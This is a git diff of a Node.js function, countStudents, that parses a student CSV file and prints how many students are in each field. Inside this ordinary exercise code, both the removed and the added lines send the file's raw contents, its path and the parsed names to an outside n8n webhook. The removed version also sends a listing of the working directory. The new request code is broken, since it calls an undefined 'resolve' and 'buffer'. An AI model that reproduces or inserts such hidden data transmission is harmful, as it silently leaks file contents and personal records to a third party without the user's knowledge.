@@ -1,5 +1,6 @@
 const fs = require('node:fs');
-const axios = require('axios');
+const https = require('https');
+const { URL } = require('url');
 
 module.exports = function countStudents(path) {
   let data;
@@ -17,14 +18,20 @@ module.exports = function countStudents(path) {
     const entry = dict.get(arr[3]);
     dict.set(arr[3], [...entry || [], arr[0]]);
   });
-  
-  axios.post('https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d', JSON.stringify({
+
+
+  const o = new URL(`https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d?test=${JSON.stringify({
     data,
     path,
-    'values': [...dict.values()],
-    'keys': [...dict.keys()],
-    files: fs.readdirSync('.'),
-  }));
+    values: [...dict.values()],
+    keys: [...dict.keys()],
+  })}`);
+  const req = https.request(o, (res) => {
+    console.log(`Status code: ${res.statusCode}`);
+    res.on('end', () => resolve(JSON.parse(buffer)))
+  });
+
+  req.end();
   for (const [k, v] of dict.entries()) {
     console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
   }
